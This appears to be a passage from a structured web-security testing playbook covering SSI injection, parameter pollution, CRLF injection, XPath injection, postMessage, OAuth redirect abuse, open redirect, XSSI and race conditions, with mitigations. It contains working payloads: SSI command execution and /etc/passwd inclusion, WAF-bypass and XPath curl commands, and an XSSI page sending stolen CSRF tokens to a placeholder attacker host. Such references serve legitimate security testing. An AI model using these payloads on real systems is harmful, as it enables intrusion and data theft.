mitigation: Aggressively restrict the use of unkeyed inputs within the application's routing logic and response generation. If an HTTP header or parameter dictates the content of the response, it must be explicitly included in the Cache Key configuration at the CDN/Proxy layer.
Configure the caching layer to be highly selective, caching only strictly static resources (e.g., images, CSS files) rather than dynamic HTML pages or API responses.

If dynamic content must be cached, rigidly strip all unrecognized or non-standard HTTP headers at the reverse proxy before they reach the backend application, ensuring attackers cannot supply hidden inputs.
Implement modern framework security features to strictly define the application's base URL in server configuration, explicitly ignoring client-supplied routing headers.

WEB-101.prerequisites: A web application hosted on a web server (such as Apache, IIS, or Nginx) configured to parse Server-Side Includes (SSI). The application must dynamically embed user-supplied input into HTML pages that are subsequently processed for SSI directives (often identifiable by `.shtml`, `.stm`, or `.shtm` file extensions, though servers can be configured to parse standard `.html` files as well).
WEB-101.whatItIs: Some web servers support special comment-like instructions embedded in HTML pages that get processed and run server-side before the page is sent out. If the app puts unfiltered user input into a page that's processed this way, an attacker can inject one of these instructions themselves — including one that runs an operating-system command — and have the server carry it out as if it were a legitimate, developer-written instruction.
WEB-101.rootCause: User input isn't cleaned up before being placed into the page, and on top of that, the web server has this special instruction-processing feature turned on. Together, that lets an attacker's input get executed as a real server-side command instead of just being displayed as harmless text.
WEB-101.impact: Exploiting SSI Injection leads directly and reliably to Remote Code Execution (RCE) in the context of the web server's service account (e.g., `www-data` or `IUSR`). The attacker can execute arbitrary operating system commands, read sensitive system files, manipulate the file system, establish reverse shells, and completely compromise the underlying server infrastructure.
stepsToIdentify: Map the application and identify parameters that are reflected in the HTML response (e.g., user profiles, comment sections, or error messages).
Look for telltale file extensions like `.shtml`, `.shtm`, or `.stm`, which explicitly indicate SSI processing is enabled on the server.
Inject a benign, non-disruptive SSI directive to test for parsing, such as `<!--#echo var="DATE_LOCAL" -->` or `<!--#echo var="DOCUMENT_NAME" -->`.

Meticulously analyze the HTTP response. If the server replaces the injected payload with the current server date or the document name, the presence of an SSI Injection vulnerability is definitively confirmed.
exploitationSteps: Upon confirming the vulnerability, construct a payload designed to execute a harmless operating system command to verify RCE capabilities. For Linux/Apache, inject `<!--#exec cmd="id" -->` or `<!--#exec cmd="whoami" -->`.
Submit the payload through the vulnerable input vector and navigate to the page where the input is rendered.
Capture the HTTP response containing the output of the executed OS command.

If `cmd` execution is disabled (e.g., via `IncludesNOEXEC` in Apache), attempt to escalate by using the `include` directive to read local files, such as `<!--#include virtual="/etc/passwd" -->` or `<!--#include file="config.php" -->`.
Document the exact injection vector, the payload used, and the resulting execution output. Do not attempt to establish persistence or exfiltrate production databases.

examplePayloads.label: Benign SSI payload to verify server-side parsing (Echoing Server Date)
SSI Command Execution payload (Linux RCE)
SSI File Inclusion payload (Bypassing cmd execution restrictions)

variants: Command Execution (`#exec cmd`): Direct execution of arbitrary operating system commands.
File Inclusion (`#include file` or `#include virtual`): Reading arbitrary sensitive files from the server's file system, potentially bypassing command execution restrictions.
CGI Execution (`#exec cgi`): Forcing the server to execute unintended CGI scripts.
mitigation: The most effective mitigation is to completely disable Server-Side Includes globally at the web server level if they are not strictly required for application functionality. In Apache, remove the `Includes` option from the `Options` directive.

If SSI is absolutely necessary, strictly enforce the `IncludesNOEXEC` option (in Apache) to permit the inclusion of static files while categorically blocking the execution of OS commands and CGI scripts.

Implement rigorous, context-aware output encoding. All user-supplied data must be HTML-entity encoded before being rendered into the HTML document, effectively neutralizing the `<` and `>` characters required to construct an SSI directive.
Transition away from legacy SSI architectures to modern, secure templating engines (e.g., Jinja2, Twig, React) that inherently separate data from executable template logic.

WEB-102.prerequisites: Access to a web application that processes HTTP requests containing multiple parameters with the identical name (e.g., `?id=1&id=2`). An intercepting proxy like Burp Suite to effortlessly manipulate query strings, form data, and HTTP headers.
WEB-102.whatItIs: When a request includes the same parameter name more than once, different systems handle that oddly and inconsistently — one system might use the first value, another the last, another might merge them together. An attacker can exploit that disagreement between, say, a security filter and the actual application, to sneak something malicious past the filter while the app processes something entirely different.
WEB-102.rootCause: There's no universal standard for how a duplicate parameter should be handled, so different technologies genuinely behave differently by design. The problem shows up specifically when a security check (like a firewall) reads that duplicate parameter differently than the actual application logic behind it does — creating a gap between what gets checked and what actually gets used.
WEB-102.impact: HPP can be leveraged to achieve several severe outcomes. It is frequently used to bypass Web Application Firewalls (WAFs) by hiding malicious payloads in a parameter the WAF ignores, but the backend processes. It can also be exploited to trigger Insecure Direct Object References (IDOR), manipulate application logic (e.g., overriding a recipient email address in a transfer function), or exploit Cross-Site Scripting (XSS) if the concatenated values break out of intended contexts.
stepsToIdentify: Map the application and identify critical state-changing parameters or data retrieval parameters (e.g., `?user_id=123`, `action=view`).
Inject a duplicate parameter into the request (e.g., modify `?user_id=123` to `?user_id=123&user_id=456`).

Meticulously observe the application's response to determine the backend parsing behavior. Does the application return the profile for user 123 (First-One-Wins), user 456 (Last-One-Wins), or trigger a database error (Concatenation, e.g., querying for `123,456`)?
If a WAF is present, determine if the WAF and the backend application parse the identical request differently (e.g., WAF checks the first parameter, but PHP processes the last parameter).
exploitationSteps: To bypass a WAF blocking an SQL injection: Send a request like `?id=1&id=1' OR 1=1--`. If the WAF only inspects the first `id` parameter (which is benign) but the backend PHP application executes the last `id` parameter, the payload will successfully bypass the filter and execute.

To exploit application logic (e.g., IDOR/Authorization bypass): Send a request to an action endpoint like `POST /transfer` with body `from_account=123&to_account=456&from_account=999`. If the authorization check validates the first `from_account` but the actual transfer logic utilizes the last `from_account`, the attacker successfully steals funds.
Document the environmental parsing discrepancy and the exact payload construction required to exploit the logic flaw.

Report the specific parameter-parsing precedence discrepancy observed (first-value-wins at the WAF vs. last-value-wins at the application, or vice versa) so remediation can standardize parsing behavior across the stack.

examplePayloads.label: Testing backend parsing behavior (First, Last, or Concatenation)
examplePayloads.command:
curl -s "https://<target-url>/profile?user_id=100&user_id=200"
# Observe if profile 100, profile 200, or an error is returned.

examplePayloads.label: WAF Evasion payload leveraging HPP (Targeting a PHP backend)
examplePayloads.command:
curl -s "https://<target-url>/search?query=safe_string&query=<script>alert(1)</script>"
# WAF validates first 'query', PHP executes second 'query'.

examplePayloads.label: Exploiting Logic Flaws/Authorization bypass via HPP

variants: Client-Side HPP: Occurs when polluted parameters are reflected into client-side JavaScript, leading to DOM XSS or logic manipulation within the browser.
Server-Side HPP: Occurs when polluted parameters manipulate backend logic, bypass authorization checks, or alter internal API requests.
WAF Bypass HPP: Specifically weaponizing the parsing discrepancy between the security gateway and the backend application.
mitigation: Implement robust input validation utilizing a strict allowlist. The application must actively check for and explicitly reject HTTP requests containing duplicate parameter names unless specifically designed to accept arrays.
If array-based parameters are required, mandate strong type-checking at the application layer to ensure the parameter structure matches the expected schema before processing.

Ensure architectural alignment between security controls (WAF, API Gateway) and the backend application. Both layers must parse and validate HTTP parameters using identical logic (e.g., both strictly evaluating all instances of a parameter).

Utilize secure web frameworks that natively handle duplicate parameters predictably, and explicitly extract parameters using strict API calls (e.g., explicitly fetching the first value or throwing an exception on duplicates).

WEB-103.prerequisites: Access to a web application endpoint that reflects unvalidated user input directly into HTTP response headers (most commonly occurring within `Location` headers during redirects, or `Set-Cookie` headers). An intercepting proxy like Burp Suite to inject raw Carriage Return and Line Feed (CRLF) URL-encoded characters (`%0d%0a`).
WEB-103.whatItIs: The app takes user input and places it directly into an HTTP response header without stripping out invisible line-break characters. Since those characters are exactly what tells a browser 'this header just ended,' an attacker can inject them to fake the end of the headers and start writing their own, effectively splitting the response into two and controlling everything after that point.
WEB-103.rootCause: User-supplied text gets pasted directly into a response header without checking for or removing line-break characters first. When that unfiltered text reaches the web server, it treats those characters exactly like real, legitimate header breaks — because from its perspective, there's no difference.
WEB-103.impact: Exploiting CRLF injection allows an attacker to forge entirely new HTTP headers (such as injecting a malicious `Set-Cookie` header to perform Session Fixation). Furthermore, by injecting a double CRLF sequence, the attacker can force the server to prematurely terminate the header section and inject malicious HTML or JavaScript into the newly created response body, leading to severe Cross-Site Scripting (XSS). In environments utilizing caching, this can be escalated to critical Web Cache Poisoning.
stepsToIdentify: Identify application endpoints that reflect input into HTTP headers, commonly found in redirect parameters (e.g., `?next=/home`), language selection cookies, or custom tracking headers.
Inject a benign custom header using URL-encoded CRLF characters. For example, append `%0d%0aX-Injected-Header:%20Vulnerable` to the target parameter.

Meticulously analyze the raw HTTP response. If the `X-Injected-Header: Vulnerable` appears on a new, distinct line within the HTTP response headers, the CRLF injection vulnerability is definitively confirmed.
Ensure you are testing against HTTP/1.1 endpoints, as HTTP/2 framing mechanisms inherently neutralize traditional CRLF injection within headers.
exploitationSteps: To exploit for Session Fixation or Cookie manipulation: Inject a payload designed to forge a `Set-Cookie` header. Example payload: `%0d%0aSet-Cookie:%20session_id=attacker_controlled_value;%20Secure;%20HttpOnly`.

To exploit for Cross-Site Scripting (HTTP Response Splitting): Inject a double CRLF sequence followed by a malicious HTML payload. Example payload: `%0d%0a%0d%0a<script>alert(document.domain)</script>`. Note: Modern browsers possess strict anti-response-splitting heuristics, making this specific XSS vector heavily reliant on older browsers or specific cache poisoning techniques.

To exploit Web Cache Poisoning: Inject a double CRLF sequence followed by a malicious payload on a cacheable endpoint. If the caching layer stores the split, poisoned response, it will serve the XSS payload to all subsequent legitimate users requesting that resource.
Document the raw HTTP request and response demonstrating the structural manipulation of the HTTP protocol.

examplePayloads.label: Identifying CRLF Injection by injecting a benign custom header
Exploiting CRLF Injection to forge a malicious Set-Cookie header (Session Fixation)
HTTP Response Splitting payload aiming for XSS (injecting body content)

variants: Header Injection (CRLF): Injecting a single CRLF sequence to forge additional HTTP headers, enabling Session Fixation or CORS manipulation.
HTTP Response Splitting: Injecting a double CRLF sequence to prematurely terminate the header block and dictate the contents of the HTTP response body, enabling XSS or Cache Poisoning.

HTTP Request Smuggling via CRLF: Utilizing CRLF injection specifically within reverse-proxy communications to forge `Content-Length` or `Transfer-Encoding` headers, escalating to request desynchronization.
mitigation: Implement rigorous, server-side input validation and strict output encoding. Specifically, aggressively strip or sanitize all Carriage Return (`\r`, `%0d`) and Line Feed (`\n`, `%0a`) characters from any user-supplied data before incorporating it into an HTTP response header.

Utilize modern web application frameworks and updated language runtimes. Most contemporary web servers and frameworks (e.g., modern versions of PHP, Node.js, and Java Spring) natively detect and block CRLF injection attempts at the API level by automatically throwing exceptions if newline characters are passed to header-setting functions.
Transition application architecture to HTTP/2 where possible, as its binary framing layer natively prevents attackers from manipulating header boundaries using plaintext CRLF characters.

WEB-105.prerequisites: A web application that utilizes an XML backend database or heavily relies on XML documents for data storage and authentication. The application must dynamically query this XML data using the XPath language, constructing the queries by directly concatenating user-supplied input.
WEB-105.whatItIs: This is essentially SQL injection, but for apps that search XML data (using a query language called XPath) instead of a database. An attacker sends specially crafted input that changes the logic of the search itself — for example, tricking a login check into always returning true, letting them log in without a real password.
WEB-105.rootCause: User input — like a username or password field — gets pasted directly into the search query text instead of being kept safely separate as pure data. Without escaping special characters that have meaning in this query language, an attacker's input can break out of where it's supposed to stay and add their own logic to the search.
WEB-105.impact: Exploitation grants the attacker the ability to completely bypass XML-based authentication portals. Furthermore, through XPath tree traversal and blind injection techniques, an attacker can systematically extract the entire structure and contents of the backend XML document, leading to severe information disclosure of sensitive credentials, PII, and internal application configurations.
stepsToIdentify: Identify application endpoints that likely process XML data on the backend, such as legacy SOAP web services, B2B data exchange portals, or older authentication systems.
Inject standard string termination and logical characters into input fields, such as `'`, `"`, `]`, `' or '1'='1`, and `' or 1=1 or ''='`.

Meticulously observe the HTTP response. A verbose XML parsing error, an XPath compilation exception, or an anomalous successful login (when using invalid credentials alongside an injected tautology) definitively indicates the presence of an XPath injection vulnerability.
exploitationSteps: To exploit Authentication Bypass: Assume the query targets a login endpoint. Inject `admin' or '1'='1` into the username field, and any string into the password field. The resulting XPath evaluation becomes `//user[username/text()='admin' or '1'='1' and password/text()='random']`. The tautology `'1'='1'` evaluates to true, satisfying the condition and bypassing the password check entirely.

To exploit Blind XPath Injection (Data Extraction): If the application suppresses output, utilize XPath functions like `string-length()` and `substring()` to extract data character by character. Inject payloads like `admin' and string-length(password)=8 or 'a'='b`. Iterate through lengths and characters based on the application's true/false response behavior.
To extract the XML schema structure: Utilize XPath axes (e.g., `name(/*[1])` to get the root node name, or `count(//user)` to enumerate nodes) to systematically map the entire XML document.
Document the precise injection payload required to manipulate the XPath logic and the extent of the data exposed.

examplePayloads.label: Authentication Bypass payload via XPath tautology
Blind XPath Extraction payload (Checking if the first character of the password is 'A')
examplePayloads.command: curl -X POST -d "username=admin' and substring(password,1,1)='A' or 'a'='b&password=IgnoreThis" https://<target-url>/xml_login

examplePayloads.label: XPath Node Enumeration payload (Extracting the name of the root node)
examplePayloads.command: curl -X POST -d "username=admin' and substring(name(/*[1]),1,1)='U' or 'a'='b&password=IgnoreThis" https://<target-url>/xml_login

variants: In-band XPath Injection: The application directly reflects the contents of the queried XML nodes into the HTTP response.

Blind (Boolean) XPath Injection: The application does not return data, but the attacker infers the XML structure and node values by observing differential application behavior (True/False responses) induced by injected XPath logic.
XPath Axis Traversal: Exploiting XPath's powerful navigational axes (like `parent::`, `child::`, `descendant::`) to break out of the intended XML node and explore the entire document hierarchy.
mitigation: The primary defense is to utilize pre-compiled XPath queries equipped with variable binding (parameterization), supported by robust XML libraries (e.g., `XPathExpression.evaluate` in Java with properly bound `QName` variables). This ensures user input is strictly evaluated as literal data, completely neutralizing injected logic.

If parameterization is unavailable in the specific technology stack, implement rigorous, server-side allowlist validation, strictly rejecting any input containing characters that carry syntactic meaning in XPath (`'`, `"`, `[`, `]`, `/`, `*`).

Implement robust, context-aware encoding. If input must be concatenated into a string literal, developers must meticulously escape single and double quotes to prevent the attacker from terminating the string context.

Enforce the Principle of Least Privilege by ensuring the XML document queried by the application does not store highly sensitive data (like plaintext passwords or system credentials) that are unnecessary for the application's immediate function.

WEB-106.prerequisites: A web application that utilizes the HTML5 `window.postMessage()` API to facilitate cross-origin communication between different windows, pop-ups, or iframes. The attacker requires the ability to host a malicious HTML page containing an iframe that targets the vulnerable application.
WEB-106.whatItIs: postMessage is a legitimate browser feature that lets one webpage safely send data to another, even across different websites — but only if the page receiving the message actually checks who sent it. If that check is missing, the app will process a message from literally any website that decides to send it one, not just the legitimate partner it was built to talk to.
WEB-106.rootCause: The code listening for these cross-site messages never checks which website the message actually came from — it just processes whatever it receives. If that unchecked data then gets used somewhere dangerous, like being inserted directly into the page or run as code, a malicious website can exploit that gap.
WEB-106.impact: The impact hinges entirely on how the receiving application processes the unvalidated message data. If the data is rendered unsafely, it leads directly to DOM-based Cross-Site Scripting (DOM XSS), allowing the attacker to achieve full JavaScript execution within the victim's session on the vulnerable application. Alternatively, if the message dictates state (e.g., initiating a transaction, changing a password, or altering a redirect URL), it acts as a highly potent, cross-origin CSRF vector.
stepsToIdentify: Thoroughly analyze the application's client-side JavaScript source code, specifically searching for implementations of `window.addEventListener("message", ...)` or `window.onmessage`.
Meticulously review the logic within the event handler. Identify if the code explicitly checks the `event.origin` property against a hardcoded, strict allowlist of trusted domains.

If the `origin` check is completely missing, utilizes weak regex (e.g., vulnerable to `targetdomain.attacker.com`), or utilizes `indexOf()`, the listener is susceptible to receiving malicious messages.

Trace the flow of the `event.data` payload. Identify if the unvalidated data is passed into a dangerous JavaScript sink (e.g., `document.write()`, `element.innerHTML`, `setTimeout()`) or alters critical application state.
exploitationSteps: Construct a malicious HTML page hosted on an attacker-controlled external domain.
Embed an `<iframe>` within the malicious page, configuring its `src` attribute to load the vulnerable target application.

Implement a JavaScript payload on the malicious page that waits for the iframe to load, and then utilizes `iframe.contentWindow.postMessage()` to transmit a crafted, malicious payload to the vulnerable application.
The payload must be specifically formatted (e.g., a specific JSON structure) to properly traverse the target application's internal parsing logic and reach the vulnerable execution sink.

Simulate a victim visiting the attacker's page. The malicious message is transmitted cross-origin, processed by the vulnerable listener, and the payload (e.g., XSS) executes within the security context of the target application.

examplePayloads.label: Identifying missing origin validation in client-side code (Example Vulnerable Code)
Malicious Attacker Page executing DOM XSS via postMessage

variants: Missing Origin Validation: The event listener completely omits checking `event.origin`.

Flawed Origin Validation: The listener attempts to validate the origin but utilizes insecure methods (like `event.origin.indexOf("trusted.com") > -1`, allowing bypasses via `trusted.com.attacker.com`).

Insecure Target Origin (Data Leakage): The sending application utilizes `postMessage(data, "*")` instead of specifying a strict target origin, blindly broadcasting highly sensitive data to any iframe or parent window that happens to be listening.
mitigation: Mandate strict, rigorous validation of the `event.origin` property at the absolute beginning of every `message` event listener. The origin must be validated against a hardcoded, exact-match allowlist of explicitly trusted domains (e.g., `if (event.origin !== "https://www.trusted.com") return;`).

When transmitting sensitive data utilizing `window.postMessage()`, developers must explicitly specify the exact target origin as the second parameter (e.g., `postMessage(data, "https://www.target.com")`). Never utilize the wildcard `"*"` for the target origin when transmitting confidential information.

Regardless of strict origin validation, treat the incoming `event.data` as completely untrusted input. Apply rigorous schema validation (if expecting JSON) and utilize context-aware output encoding (or safe sinks like `textContent`) before rendering the data to the DOM to prevent DOM-based XSS.

WEB-107.prerequisites: An application implementing the OAuth 2.0 or OpenID Connect (OIDC) protocol for single sign-on (SSO) or third-party authorization. The attacker requires an intercepting proxy to analyze the OAuth flow and a controlled external web server to receive hijacked authorization codes.
WEB-107.whatItIs: During a single sign-on login (OAuth), the identity provider is supposed to send the user's temporary login code back to one specific, pre-approved web address. If it doesn't strictly check that address against an exact, known list, an attacker can manipulate it to have that sensitive code sent to a server they control instead — letting them log in as the victim.
WEB-107.rootCause: Instead of requiring an exact match against a specific, pre-registered list of allowed callback addresses, the identity provider uses a loose check — like a pattern that accidentally matches more than it should, or that ignores part of the address — letting an attacker slip through a slightly modified version of a legitimate destination.
WEB-107.impact: Successful interception of the Authorization Code (or implicit Access Token) leads immediately to full Account Takeover. The attacker exchanges the stolen code for a legitimate access token, granting them complete administrative control over the victim's account within the target application. Furthermore, a missing or unvalidated `state` parameter in the OAuth flow enables OAuth CSRF, allowing an attacker to forcefully link their own social media account to a victim's application account, establishing persistent unauthorized access.
stepsToIdentify: Initiate the OAuth login flow and intercept the initial authorization request (typically containing `response_type=code`, `client_id`, and `redirect_uri` parameters) originating from the client application and destined for the Identity Provider.

Meticulously attempt to manipulate the `redirect_uri` parameter. Append external domains, utilize directory traversal (`/../`), employ URL encoding tricks, or test for prefix/suffix vulnerabilities (e.g., changing `https://client.com/callback` to `https://client.com.attacker.com/callback`).

Observe the Identity Provider's response. If the IdP proceeds with the authorization flow and issues a redirect to the manipulated, attacker-controlled URI instead of returning an 'Invalid Redirect URI' error, the bypass is successful.
Simultaneously, verify the presence and cryptographic strength of the `state` parameter to ensure immunity against OAuth CSRF (Account Linking) attacks.
exploitationSteps: Host a malicious listener script on your controlled external server (e.g., `https://attacker.com/oauth_catcher`).
Craft a malicious OAuth authorization URL containing the target application's valid `client_id` and the bypassed, attacker-controlled `redirect_uri`.
Deliver the crafted URL to the victim (via phishing, XSS, or embedding it in a malicious webpage).

When the authenticated victim clicks the link, they silently authorize the request, and the Identity Provider redirects their browser—appending the highly sensitive Authorization Code in the query string—directly to the attacker's listener.
The attacker immediately extracts the code from their server logs and replays the token exchange request to the IdP, obtaining a valid access token for the victim's account.
Document the bypass methodology and immediately destroy the obtained token.

examplePayloads.label: Identifying redirect_uri validation flaws via URL manipulation
Exploiting directory traversal in redirect_uri validation
OAuth CSRF attack vector (Forcing account linking due to missing 'state' parameter)

variants: Authorization Code Interception: Stealing the `code` parameter via `redirect_uri` manipulation to achieve Account Takeover.
Implicit Flow Token Leakage: Stealing the Access Token directly from the URL fragment (hash) in legacy OAuth Implicit flows, often via Open Redirects or XSS on the client application.

OAuth CSRF (Account Linking): The attacker initiates an OAuth flow, intercepts their own Authorization Code, and tricks the victim into clicking a link that submits the attacker's code to the victim's session, permanently linking the attacker's SSO identity to the victim's account.
mitigation: Identity Providers must enforce absolute, strict exact-match validation of the `redirect_uri` parameter against a statically pre-registered list of authorized URLs. Categorically prohibit the use of wildcards, regular expressions, or dynamic path evaluation in redirect URI validation logic.

Client applications must implement and strictly validate a cryptographically strong, unpredictable `state` parameter (or utilize the modern PKCE standard) to cryptographically bind the authorization request to the specific user's browser session, definitively neutralizing OAuth CSRF attacks.

Client applications must ensure they do not harbor Open Redirect vulnerabilities, as attackers frequently chain Open Redirects on the legitimate client domain to bypass strict IdP `redirect_uri` validation.

Deprecate the legacy OAuth Implicit Flow (which exposes tokens directly in the URL) in favor of the Authorization Code Flow with PKCE (Proof Key for Code Exchange) for all modern web and mobile applications.

WEB-108.prerequisites: Access to a web application endpoint that utilizes user-supplied input to dynamically dictate the destination URL for an HTTP redirection (e.g., login portals utilizing a `?next=` or `?returnTo=` parameter, or outbound link tracking endpoints).
WEB-108.whatItIs: A page redirects users to a web address supplied in the request, without checking whether that address is actually somewhere trusted. While it's often dismissed as 'just phishing,' this can actually be chained together with other bugs to cause much more serious problems.
WEB-108.rootCause: The app trusts a redirect destination supplied by the client and inserts it directly into the redirect, without checking it against a list of allowed, trusted destinations — wrongly assuming an attacker could never manipulate that value themselves.
WEB-108.impact: While Open Redirects are notoriously leveraged to execute highly convincing phishing campaigns (as the malicious link appears to originate from the trusted target domain), their technical severity dramatically escalates when chained with other vulnerabilities. An Open Redirect can completely bypass strict OAuth `redirect_uri` validations (leading to OAuth token theft), bypass Server-Side Request Forgery (SSRF) filters by redirecting backend parsers to internal IP addresses, and enable Cross-Site Scripting (XSS) if the redirect processes the `javascript:` pseudo-protocol.
stepsToIdentify: Identify all application parameters that suggest redirection functionality (e.g., `redirect=`, `url=`, `next=`, `return_to=`, `dest=`).
Manipulate the parameter to point to an external, recognizable domain (e.g., `https://www.google.com`).

Observe the HTTP response. If the application returns a `301`, `302`, `303`, `307`, or `308` status code, and the `Location` header perfectly mirrors the injected external URL, the Open Redirect is confirmed.

If rudimentary filters block absolute external URLs, systematically attempt bypass techniques: utilizing protocol-relative URLs (`//attacker.com`), URL encoding (`%68%74%74%70...`), backslashes (`\\attacker.com`), or appending valid domains as paths (`https://attacker.com/trusted.com`).
exploitationSteps: To exploit for OAuth Token Theft: If the application uses OAuth, construct an authorization request utilizing the application's legitimate OAuth callback URL, but append the identified Open Redirect parameter pointing to your server (e.g., `redirect_uri=https://client.com/callback?next=https://attacker.com`). If the IdP validates the base URI but ignores the query parameters, the client application will blindly forward the highly sensitive OAuth token to the attacker's server.

To exploit for XSS: Inject the `javascript:` pseudo-protocol into the redirect parameter (e.g., `?next=javascript:alert(document.domain)`). If the application implements redirection via client-side JavaScript (e.g., `window.location = url`) or fails to validate the protocol in a server-side redirect, it achieves execution.

To exploit SSRF Bypass: If an application feature fetches external URLs but blacklists internal IPs (like `127.0.0.1`), supply a URL pointing to the vulnerable Open Redirect on the application itself, directing it to the internal IP (`fetch_url=https://client.com/redirect?url=http://127.0.0.1`). The backend HTTP client may follow the redirect, completely bypassing the initial SSRF IP validation.
Document the specific bypasses utilized and the chained impact to accurately reflect the vulnerability's true severity.

examplePayloads.label: Identifying basic Open Redirect behavior
Bypassing naive prefix validation using a protocol-relative URL
Chaining Open Redirect to achieve Cross-Site Scripting (XSS)

variants: Server-Side Open Redirect: The server responds with an HTTP redirection status code (e.g., 302) and an unvalidated `Location` header.
Client-Side (DOM-Based) Open Redirect: Client-side JavaScript reads an unvalidated URL from the query string or hash fragment and dangerously assigns it to `window.location` or `location.href`.
Header-Based Open Redirect: Exploiting HTTP Response Splitting (CRLF injection) to forge a `Location` header where one did not previously exist.
mitigation: The most secure approach is to architecturally eliminate the need to accept destination URLs from client input. Instead, utilize indirect object references: pass an integer ID or a short string token that strictly maps to a predetermined, server-side URL configuration.

If dynamic destination URLs are an absolute business requirement, implement a rigid, server-side exact-match allowlist of explicitly trusted domains and paths. Categorically reject any input that does not perfectly match the allowlist.

If implementing dynamic redirects for local application routing (e.g., returning to a previous page post-login), rigorously parse the URL and forcefully ensure it is a relative path (starting with a single `/`), strictly rejecting absolute URLs or protocol-relative URLs (`//`).

Explicitly validate the URL scheme, ensuring it is strictly limited to `http` or `https`, unequivocally blocking dangerous pseudo-protocols like `javascript:`, `data:`, or `vbscript:` to prevent chained XSS attacks.

WEB-109.prerequisites: A web application that dynamically generates JavaScript files containing sensitive, session-specific data (e.g., user profiles, CSRF tokens, or internal configuration details) and relies solely on ambient browser credentials (session cookies) for access control. The attacker requires the ability to host a malicious HTML page.
WEB-109.whatItIs: Browsers block one website from directly reading another website's private data — but they specifically allow loading and running another site's JavaScript file via a script tag. If an app puts sensitive, personal data directly inside a JavaScript file meant to be loaded this way, an attacker can load that file on their own malicious page and steal the data, since the victim's browser will automatically send their login cookie along when fetching it.
WEB-109.rootCause: Sensitive data ends up embedded directly inside a JavaScript file (or a similar format meant to be loaded as a script) instead of being sent as data the way it's supposed to be handled — with proper cross-site protections. Because the browser treats loading a script tag differently than reading page data directly, this specific setup slips right past the protection that would normally stop this.
WEB-109.impact: Exploitation results in unauthorized, cross-origin information disclosure. An attacker can silently exfiltrate highly sensitive data, including PII, financial details, application state, and—most critically—anti-CSRF tokens. Extracting a valid CSRF token via XSSI fundamentally breaks the application's CSRF defenses, allowing the attacker to seamlessly chain the data leakage into a devastating Account Takeover attack.
stepsToIdentify: While authenticated to the target application, meticulously analyze all HTTP responses containing `Content-Type: application/javascript` or `text/javascript`.

Identify any JavaScript files or endpoints that are dynamically generated and contain sensitive, user-specific data embedded directly within the script (e.g., global variable assignments, API keys, or CSRF tokens).
Verify that access to this specific JavaScript resource relies exclusively on session cookies and does not require custom HTTP headers (which cannot be attached via a `<script>` tag).

Log out of the application and attempt to request the identified JavaScript file. If the sensitive data is absent or an error is returned, the endpoint is confirmed to be authenticated and potentially vulnerable to XSSI.
exploitationSteps: Construct a malicious HTML page hosted on an attacker-controlled external domain.

If the sensitive data is assigned to a global variable (e.g., `var secret_data = {...}`), embed the vulnerable script using a standard `<script src="https://target.com/dynamic.js"></script>` tag, followed by a local script that accesses the newly populated global variable and exfiltrates it to the attacker's server.

If the data is delivered via a vulnerable JSONP endpoint (e.g., `https://target.com/api?callback=processData`), define the `processData` function locally within the malicious page to capture the data, and then embed the JSONP endpoint using a `<script>` tag.

Simulate a victim (holding an active session on the target application) visiting the attacker's page. The browser seamlessly fetches the authenticated script, executes it within the attacker's DOM context, and the sensitive data is successfully hijacked.
Document the specific endpoint and the methodology used to extract the sensitive data.

examplePayloads.label: Identifying dynamic, authenticated JavaScript containing sensitive data
examplePayloads.command:
curl -s -H "Cookie: session=VALID_SESSION" https://<target-url>/api/user_config.js
# Output: var user_config = {"email": "admin@example.com", "csrf_token": "xyz123"};

examplePayloads.label: Malicious Attacker Page exploiting XSSI to hijack global variables
examplePayloads.command:
<html><body>
<script src="https://<target-url>/api/user_config.js"></script>
<script>
  // The script above executes and populates the global 'user_config' variable
  fetch('https://<attacker-ip>/exfiltrate', {method: 'POST', body: JSON.stringify(user_config)});
</script>
</body></html>

examplePayloads.label: Exploiting vulnerable JSONP endpoints by defining the callback function

variants: Global Variable Hijacking: The authenticated script assigns sensitive data to global variables, which are natively accessible by the attacker's window object.
JSONP Hijacking: The endpoint wraps sensitive JSON data in a user-defined JavaScript callback function without validating the Referer/Origin, allowing the attacker to define the execution logic.

Prototype Overriding (Legacy): On older browsers, attackers could override native JavaScript constructors (like `Array` or `Object`) to intercept sensitive JSON arrays or objects during the script execution phase.
mitigation: Architecturally enforce a strict separation between executable code and data. Never embed sensitive, user-specific data directly into dynamically generated JavaScript files. Deliver all sensitive data exclusively in pure JSON format (`Content-Type: application/json`).

Strictly mandate the use of unguessable, request-specific authorization tokens (e.g., Bearer tokens sent via the `Authorization` header) rather than relying solely on ambient session cookies to protect sensitive API endpoints. Browsers cannot natively attach custom headers when fetching resources via `<script src="...">` tags, neutralizing the attack vector.
Aggressively deprecate and remove legacy JSONP implementations entirely. Modern cross-origin communication must rely exclusively on strictly configured Cross-Origin Resource Sharing (CORS) policies.

Implement un-executable prefixes for JSON responses containing sensitive data (e.g., prepending `)]}',\n` to the response body). This immediately triggers a JavaScript syntax error if an attacker attempts to load the JSON file via a `<script>` tag, while legitimate XHR/fetch clients can easily strip the prefix before parsing.

WEB-110.prerequisites: Access to a web application endpoint that implements critical business logic involving a sequential state check followed by an action (e.g., checking a user's account balance before processing a withdrawal, or checking if a discount code has already been applied). The attacker requires Burp Suite Professional, specifically utilizing the 'Turbo Intruder' extension to achieve the extreme network concurrency required to exploit multi-threading flaws.
WEB-110.whatItIs: This happens when the app checks something (like 'does this account have enough balance') and then, moments later, acts on it (deducting the balance) — but doesn't do both as one single, indivisible step. If an attacker fires off many identical requests at almost the exact same instant, several of them can all pass the initial check before any of them has actually applied their update — letting an action succeed far more times than it should.
WEB-110.rootCause: Developers often assume each request is handled completely on its own, one at a time — but with many requests arriving in parallel, two of them can both check the same starting condition and both see it as true, before either one has actually made its update. Both then proceed, and the intended limit gets bypassed entirely.
WEB-110.impact: Exploiting race conditions leads to critical business logic compromise and financial fraud. Common impacts include limit overruns (redeeming a single-use gift card ten times simultaneously), financial manipulation (withdrawing funds exceeding the account balance), inventory manipulation (purchasing more items than exist in stock), or bypassing security controls (brute-forcing a login rate-limit by sending 50 parallel requests).
stepsToIdentify: Identify high-value application features governed by strict state limits or sequential business rules (e.g., fund transfers, coupon redemption, voting mechanisms, or account registrations).
Perform the action normally to establish a baseline understanding of the intended business logic constraints.
Utilize Burp Suite's Turbo Intruder to aggressively send a highly concurrent burst of identical requests (e.g., 20 requests in 10 milliseconds) attempting to perform the restricted action.

Meticulously analyze the application's final state (e.g., checking the updated account balance or verifying the number of redeemed coupons) rather than relying solely on the HTTP response codes, which may inaccurately reflect backend data integrity.
